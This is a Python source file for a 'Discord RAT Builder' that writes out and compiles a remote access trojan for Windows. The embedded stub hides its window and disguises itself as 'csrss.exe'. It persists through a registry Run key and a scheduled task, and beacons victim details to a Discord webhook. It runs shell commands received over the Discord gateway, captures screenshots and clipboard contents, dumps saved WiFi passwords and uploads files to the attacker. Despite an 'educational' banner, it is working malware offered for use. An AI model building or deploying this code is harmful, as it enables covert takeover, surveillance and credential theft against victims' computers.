"""Discord RAT Builder — Build full-featured Discord C2 RAT .exe."""

import os
import sys
import time
import subprocess

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

RAT_STUB = r'''
import os, sys, time, json, base64, subprocess, urllib.request, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib
from datetime import datetime

WEBHOOK = "{webhook}"
TOKEN = "{token}"
CHANNEL = "{channel}"
PERSIST = {persist}
STEALTH = {stealth}
DEBUG = {debug}
SLEEP = {sleep}
PREFIX = "{prefix}"

DEBUG_LOG = []
DBG_LOCK = threading.Lock()

def dprint(msg):
    if DEBUG:
        ts = datetime.now().strftime('%H:%M:%S')
        line = f"[{{ts}}] {{msg}}"
        with DBG_LOCK:
            DEBUG_LOG.append(line)
        try:
            p = os.path.join(os.getenv("APPDATA", "."), "rat_debug.txt")
            with open(p, "a") as f:
                f.write(line + "\n")
        except: pass

def send_webhook(text):
    try:
        data = json.dumps({{"content": text}}).encode()
        req = urllib.request.Request(WEBHOOK, data=data,
                                     headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
        resp = urllib.request.urlopen(req, timeout=10)
        dprint(f"Webhook sent: {{resp.status}}")
        return True
    except Exception as e:
        dprint(f"Webhook error: {{e}}")
        return False

def send_file(filename, content_bytes):
    try:
        boundary = "----KevToolBoundary"
        body = b""
        body += f"--{{boundary}}\r\n".encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\r\n'.encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += content_bytes
        body += f"\r\n--{{boundary}}--\r\n".encode()
        req = urllib.request.Request(WEBHOOK, data=body,
                                     headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}})
        resp = urllib.request.urlopen(req, timeout=15)
        dprint(f"File sent: {{filename}} ({{len(content_bytes)}} bytes)")
    except Exception as e:
        dprint(f"File send error: {{e}}")

def get_info():
    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(),
             "os": platform.platform(), "cwd": os.getcwd(),
             "python": platform.python_version(), "pid": os.getpid()}}
    try:
        info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode().strip()
    except: info["ip"] = "N/A"
    return info

def persist():
    if not PERSIST: return
    try:
        src = sys.argv[0]
        dst = os.path.join(os.getenv("APPDATA", "."), "csrss.exe")
        if src != dst and not os.path.isfile(dst):
            shutil.copy2(src, dst)
            subprocess.Popen([dst], creationflags=0x08000000)
            dprint(f"Persistence: installed to {{dst}}")
            os._exit(0)
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        ctypes.windll.advapi32.RegSetValueExW(
            ctypes.windll.advapi32.RegOpenKeyExW(
                ctypes.windll.user32.HKEY_CURRENT_USER, key, 0, 0x20006, ctypes.byref(ctypes.c_ulong(0))
            ), "CSRSS", 0, 1, dst, len(dst)*2
        )
        dprint(f"Registry persistence set")
    except Exception as e:
        dprint(f"Persist error: {{e}}")

def take_screenshot():
    tmp = os.path.join(os.getenv("TEMP", "."), "rat_screen.bmp")
    try:
        if sys.platform == 'win32':
            ps = (
                "Add-Type -AssemblyName System.Windows.Forms;"
                "Add-Type -AssemblyName System.Drawing;"
                "$b = New-Object System.Drawing.Bitmap("
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
                "$g = [System.Drawing.Graphics]::FromImage($b);"
                "$g.CopyFromScreen(0, 0, 0, 0, $b.Size);"
                "$b.Save('" + tmp.replace("\\", "\\\\") + "');"
                "$g.Dispose(); $b.Dispose()"
            )
            r = subprocess.run(
                ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode != 0:
                dprint(f"PS screenshot stderr: {{r.stderr[:200]}}")
            if os.path.isfile(tmp):
                with open(tmp, 'rb') as f:
                    data = f.read()
                if len(data) > 1000:
                    dprint(f"Screenshot captured: {{len(data)}} bytes")
                    return data
                else:
                    dprint("Screenshot file too small, likely empty")
            else:
                dprint("Screenshot temp file not created")
    except Exception as e:
        dprint(f"Screenshot error: {{e}}")
    finally:
        try: os.remove(tmp)
        except: pass
    return None

def run_command(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, encoding='utf-8', errors='replace')
        output = r.stdout + r.stderr
        dprint(f"CMD: {{cmd[:40]}} -> {{len(output)}} chars")
        return output[:1900] if output else "(no output)"
    except subprocess.TimeoutExpired:
        return "(timeout 30s)"
    except Exception as e:
        return f"Error: {{e}}"

def get_clipboard():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                           capture_output=True, text=True, timeout=5)
        return r.stdout.strip() or "(empty)"
    except: return "(error)"

def list_files(path):
    try:
        items = os.listdir(path)
        result = []
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(f"  [DIR]  {{item}}/")
            else:
                size = os.path.getsize(full)
                if size > 1048576:
                    result.append(f"  [FILE] {{item}} ({{size/1048576:.1f}} MB)")
                elif size > 1024:
                    result.append(f"  [FILE] {{item}} ({{size/1024:.1f}} KB)")
                else:
                    result.append(f"  [FILE] {{item}} ({{size}} B)")
        return "\n".join(result[:50]) if result else "(empty directory)"
    except Exception as e:
        return f"Error: {{e}}"

def get_wifi():
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=10)
        lines = r.stdout.split('\n')
        profiles = []
        for line in lines:
            if "All User Profile" in line:
                name = line.split(":")[-1].strip()
                if name:
                    r2 = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                         capture_output=True, text=True, timeout=10)
                    pwd = ""
                    auth = ""
                    for l2 in r2.stdout.split('\n'):
                        if "Key Content" in l2:
                            pwd = l2.split(":")[-1].strip()
                        if "Authentication" in l2:
                            auth = l2.split(":")[-1].strip()
                    entry = f"  {{name}}"
                    if auth: entry += f" ({{auth}})"
                    entry += f": {{pwd or '(no key)'}}"
                    profiles.append(entry)
        return "\n".join(profiles[:20]) if profiles else "(no wifi profiles)"
    except Exception as e:
        return f"Error: {{e}}"

def handle_command(cmd_text):
    parts = cmd_text.strip().split(" ", 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""
    dprint(f"Command: {{cmd}} args={{args[:30]}}")

    if cmd == "info":
        info = get_info()
        return "\n".join(f"{{k}}: {{v}}" for k, v in info.items())
    elif cmd == "shell":
        return run_command(args if args else "whoami")
    elif cmd == "cd":
        if args:
            try:
                os.chdir(args)
                return f"Changed to: {{os.getcwd()}}"
            except Exception as e:
                return str(e)
        return os.getcwd()
    elif cmd == "ls":
        return list_files(args if args else os.getcwd())
    elif cmd == "screenshot":
        data = take_screenshot()
        if data:
            send_file("screenshot.bmp", data)
            return "Screenshot sent via webhook"
        return "Screenshot failed"
    elif cmd == "clipboard":
        return get_clipboard()
    elif cmd == "setclip":
        if args:
            try:
                subprocess.run(["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{{args.replace(chr(39), chr(39)+chr(39))}}'"],
                               capture_output=True, timeout=5)
                return f"Clipboard set to: {{args[:50]}}"
            except: return "Failed to set clipboard"
        return "Usage: setclip <text>"
    elif cmd == "wifi":
        return get_wifi()
    elif cmd == "processes":
        try:
            r = subprocess.run("tasklist /FO CSV /NH", shell=True, capture_output=True, text=True, timeout=10)
            lines = [l.strip() for l in r.stdout.strip().split('\n') if l.strip()]
            procs = []
            for line in lines[:30]:
                parts2 = line.replace('"', '').split(',')
                if len(parts2) >= 5:
                    procs.append(f"  {{parts2[0]:30}} PID={{parts2[1]:>8}} Mem={{parts2[4]:>12}}")
            return "\n".join(procs) if procs else "(no processes)"
        except Exception as e:
            return f"Error: {{e}}"
    elif cmd == "killproc":
        if args:
            return run_command(f"taskkill /F /IM {{args}}")
        return "Usage: killproc <process_name.exe>"
    elif cmd == "sysinfo":
        try:
            info_items = []
            info_items.append(f"User: {{os.getenv('USERNAME', '?')}}@{{platform.node()}}")
            info_items.append(f"OS: {{platform.platform()}}")
            info_items.append(f"Python: {{platform.python_version()}}")
            info_items.append(f"Arch: {{platform.machine()}}")
            info_items.append(f"CPU: {{platform.processor() or 'N/A'}}")
            try:
                r = subprocess.run("wmic OS get FreePhysicalMemory /Value", shell=True, capture_output=True, text=True, timeout=5)
                for line in r.stdout.split('\n'):
                    if "FreePhysicalMemory" in line and "=" in line:
                        kb = int(line.split("=")[1].strip())
                        info_items.append(f"Free RAM: {{kb/1048576:.1f}} GB")
            except: pass
            try:
                r = subprocess.run("wmic OS get TotalVisibleMemorySize /Value", shell=True, capture_output=True, text=True, timeout=5)
                for line in r.stdout.split('\n'):
                    if "TotalVisibleMemorySize" in line and "=" in line:
                        kb = int(line.split("=")[1].strip())
                        info_items.append(f"Total RAM: {{kb/1048576:.1f}} GB")
            except: pass
            try:
                r = subprocess.run("wmic logicaldisk get Size,FreeSpace,DeviceID /FORMAT:CSV", shell=True, capture_output=True, text=True, timeout=5)
                for line in r.stdout.strip().split('\n')[1:]:
                    p2 = line.strip().split(',')
                    if len(p2) >= 4 and p2[2]:
                        free_gb = int(p2[2]) / 1073741824 if p2[2].isdigit() else 0
                        total_gb = int(p2[3]) / 1073741824 if p2[3].isdigit() else 0
                        info_items.append(f"  {{p2[1]}} {{free_gb:.1f}}GB free / {{total_gb:.1f}}GB")
            except: pass
            info_items.append(f"CWD: {{os.getcwd()}}")
            return "\n".join(info_items)
        except Exception as e:
            return f"Error: {{e}}"
    elif cmd == "download":
        if os.path.isfile(args):
            with open(args, 'rb') as f:
                send_file(os.path.basename(args), f.read())
            return f"Sent: {{args}}"
        return f"File not found: {{args}}"
    elif cmd == "upload":
        return "Use webhook to send files (receives via last message)"
    elif cmd == "persist":
        persist()
        return "Persistence attempt done"
    elif cmd == "keylog_start":
        return run_command(f'schtasks /create /tn "CSRSS" /tr "{{os.path.abspath(sys.argv[0])}}" /sc onlogon /f')
    elif cmd == "kill":
        send_webhook("[RAT] Self-terminating")
        os._exit(0)
    elif cmd == "help":
        return """Commands:
  info          - System info
  sysinfo       - Detailed system info (RAM, disks)
  shell <cmd>   - Run command
  cd <path>     - Change directory
  ls [path]     - List files
  screenshot    - Take screenshot (sent via webhook)
  clipboard     - Get clipboard content
  setclip <txt> - Set clipboard content
  wifi          - Show saved WiFi passwords
  processes     - List running processes
  killproc <p>  - Kill process by name
  download <f>  - Send file via webhook
  persist       - Install persistence
  kill          - Terminate RAT
  help          - This help"""
    else:
        return f"Unknown command: {{cmd}} (try 'help')"

GATEWAY_URL = "gateway.discord.gg"
GATEWAY_PATH = "/?v=10&encoding=json"
INTENTS = (1 << 0) | (1 << 9) | (1 << 15)

def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def _ws_connect(host, path):
    ctx = ssl.create_default_context()
    raw = socket.create_connection((host, 443), timeout=15)
    s = ctx.wrap_socket(raw, server_hostname=host)
    key = base64.b64encode(os.urandom(16)).decode()
    req = "GET {{}} HTTP/1.1\r\nHost: {{}}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {{}}\r\nSec-WebSocket-Version: 13\r\n\r\n".format(path, host, key)
    s.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            s.close()
            raise Exception("No response from gateway")
        resp += chunk
    if b"101" not in resp.split(b"\r\n")[0]:
        s.close()
        raise Exception("WebSocket upgrade failed")
    return s

def _ws_send(sock, payload, opcode=0x1):
    data = payload.encode() if isinstance(payload, str) else payload
    frame = bytearray([0x80 | opcode])
    mask = os.urandom(4)
    n = len(data)
    if n < 126:
        frame.append(0x80 | n)
    elif n < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack('>H', n))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack('>Q', n))
    frame.extend(mask)
    for i in range(n):
        frame.append(data[i] ^ mask[i % 4])
    sock.sendall(bytes(frame))

def _ws_recv(sock):
    hdr = _recv_exact(sock, 2)
    if not hdr:
        return None, None
    opcode = hdr[0] & 0x0F
    length = hdr[1] & 0x7F
    if length == 126:
        ext = _recv_exact(sock, 2)
        if not ext: return None, None
        length = struct.unpack('>H', ext)[0]
    elif length == 127:
        ext = _recv_exact(sock, 8)
        if not ext: return None, None
        length = struct.unpack('>Q', ext)[0]
    payload = _recv_exact(sock, length) or b""
    if opcode == 0x9:
        _ws_send(sock, payload, 0xA)
    return opcode, payload

def main():
    dprint("=== RAT STARTING ===")
    dprint(f"Webhook: {{WEBHOOK[:30]}}...")
    dprint(f"Sleep: {{SLEEP}}s | Prefix: {{PREFIX}} | Persist: {{PERSIST}} | Debug: {{DEBUG}}")
    persist()
    if STEALTH:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            dprint("Console hidden")
        except: pass
    info = get_info()
    send_webhook(f"[RAT CONNECTED] {{info['user']}}@{{info['computer']}} | {{info['os']}} | IP: {{info['ip']}}")

    has_commands = bool(TOKEN and CHANNEL)
    if not has_commands:
        dprint("No token/channel provided - webhook beacon only")
        send_webhook("[RAT] Beacon-only mode (no command channel configured)")
        while True:
            time.sleep(SLEEP)

    seq = 0
    heartbeat_interval = 40.0
    last_msg_id = None
    connected = False

    while True:
        sock = None
        try:
            dprint("Connecting to Discord Gateway...")
            sock = _ws_connect(GATEWAY_URL, GATEWAY_PATH)
            dprint("TCP+TLS+WS connected")

            opcode, payload = _ws_recv(sock)
            if opcode is None:
                raise Exception("Connection closed before HELLO")
            hello = json.loads(payload.decode())
            if hello.get("op") != 10:
                raise Exception(f"Expected HELLO op 10, got op {{hello.get('op')}}")
            heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000.0
            dprint(f"Heartbeat interval: {{heartbeat_interval:.0f}}ms")

            identify = {{
                "op": 2,
                "d": {{
                    "token": "Bot " + TOKEN,
                    "intents": INTENTS,
                    "properties": {{
                        "os": "windows",
                        "browser": "chrome",
                        "device": "",
                        "system_locale": "en-US"
                    }}
                }}
            }}
            _ws_send(sock, json.dumps(identify))
            dprint("IDENTIFY sent")
            sock.settimeout(heartbeat_interval)

            last_hb = time.time()
            connected = True
            send_webhook(f"[RAT ONLINE] {{info['user']}}@{{info['computer']}} | Commands active via gateway")

            while True:
                try:
                    opcode, payload = _ws_recv(sock)
                except socket.timeout:
                    elapsed = time.time() - last_hb
                    if elapsed >= heartbeat_interval - 1:
                        try:
                            _ws_send(sock, json.dumps({{"op": 1, "d": seq}}))
                            last_hb = time.time()
                            dprint("Heartbeat sent")
                        except Exception as e:
                            dprint(f"Heartbeat send failed: {{e}}")
                            break
                    sock.settimeout(max(1, heartbeat_interval - (time.time() - last_hb)))
                    continue

                if opcode is None:
                    dprint("Connection closed by gateway")
                    break
                if opcode == 0x9:
                    continue
                if opcode == 0x8:
                    dprint("Gateway sent close frame")
                    break

                try:
                    data = json.loads(payload.decode())
                except:
                    continue

                op = data.get("op", -1)

                if op == 0:
                    seq = data.get("s", seq) or seq
                    t = data.get("t", "")
                    if t == "READY":
                        user = data.get("d", {{}}).get("user", {{}})
                        dprint(f"READY as {{user.get('username', '?')}}#{{user.get('discriminator', '0')}}")
                    elif t == "MESSAGE_CREATE":
                        msg = data.get("d", {{}})
                        if str(msg.get("channel_id", "")) == CHANNEL:
                            content = msg.get("content", "")
                            author = msg.get("author", {{}})
                            if author.get("bot"):
                                continue
                            if content.startswith(PREFIX):
                                cmd = content[len(PREFIX):].strip()
                                if cmd:
                                    dprint(f"CMD from {{author.get('username','?')}}: {{cmd}}")
                                    result = handle_command(cmd)
                                    send_webhook(f"```\n{{result}}\n```")
                            elif content:
                                dprint(f"MSG (no prefix): {{content[:60]}}")
                elif op == 7:
                    dprint("Reconnect requested")
                    break
                elif op == 9:
                    dprint("Invalid session - reconnecting in 5s")
                    time.sleep(5)
                    break
                elif op == 11:
                    dprint("Heartbeat ACK")

        except Exception as e:
            dprint(f"Gateway error: {{e}}")
        finally:
            connected = False
            if sock:
                try: sock.close()
                except: pass

        dprint("Reconnecting in 10s...")
        time.sleep(10)

if __name__ == "__main__":
    main()
'''

def _debug_print(title, msg):
    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")

def run(kevbin=None):
    debug_mode = False
    while True:
        clear()
        dbg = " \033[91m[DEBUG]\033[0m" if debug_mode else ""
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       DISCORD RAT BUILDER{dbg}" + " "*(27-len(dbg)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Build RAT (.py)\033[0m")
        cprint("  \033[97m[2]  Build RAT (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[97m[4]  Command Reference\033[0m")
        cprint("  \033[97m[5]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '5':
            debug_mode = not debug_mode
            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
            cprint(f"  Debug: {state}")
            time.sleep(0.5)
            continue
        elif choice == '4':
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  RAT COMMAND REFERENCE\033[0m")
            cprint("  \033[93m\u2550"*54)
            cmds = [
                ("info", "System info (user, PC, OS, IP)"),
                ("sysinfo", "Detailed system info (RAM, disks)"),
                ("shell <cmd>", "Run shell command"),
                ("cd <path>", "Change directory"),
                ("ls [path]", "List directory contents"),
                ("screenshot", "Capture screen (sent via webhook)"),
                ("clipboard", "Get clipboard content"),
                ("setclip <txt>", "Set clipboard content"),
                ("wifi", "Show saved WiFi passwords"),
                ("processes", "List running processes"),
                ("killproc <name>", "Kill process by name"),
                ("download <file>", "Send file via webhook"),
                ("persist", "Install persistence"),
                ("kill", "Terminate RAT"),
            ]
            for name, desc in cmds:
                cprint(f"  \033[96m{name:20}\033[0m {desc}")
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  RAT CONFIGURATION\033[0m")
            cprint("  \033[93m\u2550"*54)
            print()
            webhook = prompt("  \033[96mWebhook URL: \033[0m").strip()
            if not webhook or 'discord' not in webhook:
                cprint("  \033[91m[X] Need valid webhook URL\033[0m"); pause(); continue
            token = prompt("  \033[96mBot Token (for commands): \033[0m").strip()
            channel = prompt("  \033[96mChannel ID (for commands): \033[0m").strip()
            if not token or not channel:
                cprint("  \033[93m[!] No token/channel — beacon-only mode (no remote commands)\033[0m")
            if debug_mode:
                _debug_print("WEBHOOK", webhook[:40] + "...")
                _debug_print("TOKEN", token[:10] + "..." if token else "NONE")
                _debug_print("CHANNEL", channel or "NONE")
            print()
            persist_opt = prompt("  \033[96mEnable persistence? (y/n, default n): \033[0m").strip().lower() == 'y'
            stealth = prompt("  \033[96mHide console? (y/n, default y): \033[0m").strip().lower() != 'n'
            try:
                sleep_sec = int(prompt("  \033[96mBeacon interval seconds (default 5): \033[0m").strip() or '5')
            except: sleep_sec = 5
            sleep_sec = max(2, sleep_sec)
            prefix = prompt("  \033[96mCommand prefix (default !): \033[0m").strip() or "!"
            print()
            if debug_mode:
                _debug_print("CONFIG", f"Persist={persist_opt} Stealth={stealth} Sleep={sleep_sec}s Prefix={prefix}")
            stub = RAT_STUB.format(
                webhook=webhook,
                token=token or "",
                channel=channel or "",
                persist=str(persist_opt),
                stealth=str(stealth),
                debug=str(debug_mode),
                sleep=sleep_sec,
                prefix=prefix
            )
            out = prompt("  \033[96mOutput filename (default: rat.py): \033[0m").strip() or "rat.py"
            if not out.endswith('.py'): out += '.py'
            if debug_mode:
                _debug_print("STUB", f"Length: {len(stub)} bytes")
            with open(out, 'w', encoding='utf-8') as f:
                f.write(stub)
            fsize = os.path.getsize(out)
            cprint(f"  \033[92m[X] Saved: {out} ({fsize} bytes)\033[0m")
            if debug_mode:
                _debug_print("FILE", f"Path: {os.path.abspath(out)}")
            if choice == '2':
                exe_name = os.path.splitext(out)[0] + ".exe"
                if debug_mode:
                    _debug_print("BUILD", f"Target: dist/{exe_name}")
                    _debug_print("BUILD", f"Python: {sys.executable}")
                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                try:
                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
                           '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
                    if debug_mode:
                        _debug_print("CMD", " ".join(cmd))
                    result = subprocess.run(cmd, check=True, timeout=180,
                                           capture_output=debug_mode, text=debug_mode)
                    if debug_mode and result.stdout:
                        for line in result.stdout.strip().split('\n')[-8:]:
                            _debug_print("PYINST", line.strip())
                    dist_path = os.path.join("dist", exe_name)
                    if os.path.isfile(dist_path):
                        esize = os.path.getsize(dist_path)
                        cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
                        if debug_mode:
                            _debug_print("DONE", f"Full: {os.path.abspath(dist_path)}")
                    else:
                        cprint(f"  \033[93m[?] Compiled but {dist_path} not found\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
                except subprocess.TimeoutExpired:
                    cprint("  \033[91m[X] Build timed out (180s)\033[0m")
                except subprocess.CalledProcessError as e:
                    cprint(f"  \033[91m[X] Build failed: exit code {e.returncode}\033[0m")
                    if debug_mode and e.stderr:
                        for line in str(e.stderr).strip().split('\n')[-6:]:
                            _debug_print("ERR", line.strip())
                except Exception as e:
                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
                    if debug_mode:
                        _debug_print("EXC", str(e))
        elif choice == '3':
            clear()
            stub = RAT_STUB.format(webhook="WEBHOOK_URL", token="BOT_TOKEN",
                                    channel="CHANNEL_ID", persist="False", stealth="True",
                                    debug="False", sleep="5", prefix="!")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
